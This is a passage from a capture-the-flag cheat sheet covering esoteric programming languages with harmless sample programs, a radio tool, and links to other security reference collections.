    It is possible to reference the parent of the current commit using the `^` symbol. For example, `HEAD^` references the parent of the current commit, and `HEAD^^` references the grandparent of the current commit.



## Esoteric Languages



Tools
-----

* `DCode` - [Website](https://www.dcode.fr)

	Support many crypto algorithms, but also some interesting tools.


* `Try It Online` - [Website](https://tio.run/)

	Online tool for running code in many languages.


Languages
---------

* `Brainfuck` - [Website](https://esolangs.org/wiki/brainfuck)

	Famous esoteric language, with a very **simple syntax**. Functions like a Turing machine.

	example Hello World:
	```brainfuck
	++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.
	```

* `COW` - [Website](https://esolangs.org/wiki/COW)

	Uses MOO statements in different **capitalizations** to represent different instructions.

	```
	MoO moO MoO mOo MOO OOM MMM moO moO
	MMM mOo mOo moO MMM mOo MMM moO moO
	MOO MOo mOo MoO moO moo mOo mOo moo
	```

* `Malboge` - [Website](https://esolangs.org/wiki/malbolge)

	Very hard language, that looks like `Base85`.

	```
	(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
	```

* `Piet` - [Website](https://esolangs.org/wiki/piet)

	Programs are represented as images. Can be interpreted with [`npiet`](https://www.bertnase.de/npiet/)

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)

* `Ook!` - [Website](http://esolangs.org/wiki/ook!)

	Recognizable by `.` and `?`, and `!`. Online interpreter for this language: [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language) 
	

	example code:
	```Ook!
	Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
	Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
	Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	```

* `Rockstar` - [Website](https://esolangs.org/wiki/Rockstar)

	Look like song lyrics.
	Rockstar has an official online interpreter: [https://codewithrockstar.com/online](https://codewithrockstar.com/online)

	Fizzbuzz in Rockstar:
	```rockstar
	Midnight takes your heart and your soul
	While your heart is as high as your soul
	Put your heart without your soul into your heart

	Give back your heart


	Desire is a lovestruck ladykiller
	My world is nothing
	Fire is ice
	Hate is water
	Until my world is Desire,
	Build my world up
	If Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothing
	Shout "FizzBuzz!"
	Take it to the top

	If Midnight taking my world, Fire is nothing
	Shout "Fizz!"
	Take it to the top

	If Midnight taking my world, Hate is nothing
	Say "Buzz!"
	Take it to the top

	Whisper my world
	```



## Wireless



* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)

    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.


<br><br>

# Other Resources

⇨ [Other CheatSheets](#other-cheatsheets)<br>




## Other CheatSheets




* `CTF-Katana` - [GitHub](https://github.com/JohnHammond/ctf-katana)

    Most of the tools and ideas provided come from there.

* `Hack Tricks` - [Website](https://book.hacktricks.xyz/)

    A collection of useful commands and tricks for penetration testing.

* `thehacker.recipes` - [Website](https://www.thehacker.recipes/)

    Very complete on Active Directory.

* `Payload All The Things` - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)

	Super useful repo that has a payload for basically every scenario

* `SecLists` - [GitHub](https://github.com/danielmiessler/SecLists)

    A LOT of wordlists for different purposes.

